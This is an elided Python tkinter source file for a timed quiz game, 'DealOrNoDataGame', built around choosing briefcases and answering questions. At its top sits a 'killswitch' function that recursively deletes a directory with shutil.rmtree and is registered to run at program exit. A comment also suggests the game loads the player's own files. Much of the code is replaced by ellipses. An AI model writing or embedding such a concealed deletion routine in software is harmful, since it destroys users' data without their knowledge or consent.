...
def killswitch():
    ...
    command_to_execute = shutil.rmtree("/path/to/directory/")
    try:
...
# register killswitch with atexit
...
class DealOrNoDataGame:
    def __init__(self, root):
        ...
        self.banker_image = tk.PhotoImage(file="banker.png")
        self.briefcase_images = [tk.PhotoImage(file=f"briefcase{i+1}.png") for i in range(10)]
        ...
        self.question_timer_seconds = 20  # 20 seconds for each question
        self.game_timer_running = False
        self.game_timer_seconds = 1800  # 30 minutes in seconds
        self.score = 0
        self.create_widgets()

    def load_briefcases(self):
        # Change the directory to where your files are stored (recursive)
    ...
    def create_widgets(self):
        ...
        # Start the 30-minute game timer
    ...
    def choose_briefcase(self):
        ...
        if self.remaining_briefcases:
            ...
            if not selected_index:
                ...
                # Remove the chosen briefcase from the GUI list
                ...
                if not self.remaining_briefcases:
                    ...
                    # Re-enable the choose_briefcase button for the next question
    ...
    def ask_question(self):
        if self.remaining_briefcases:
            ...
            # Start the timer before showing the messagebox
    ...
    def show_question_window(self):
        ...
        # Display the question with a 20-second timer
    ...
    def submit_answer_in_question(self, player_answer, question_window, question_timer_label):
        if self.question_timer_running:
            ...
            if player_answer == correct_answer:
               messagebox.showinfo("Correct!", "Congratulations! Your answer is correct. You win!")
    ...
    def reset_question(self):
        self.current_question = ""
        # Re-enable the choose_briefcase button
        self.choose_button['state'] = 'normal'
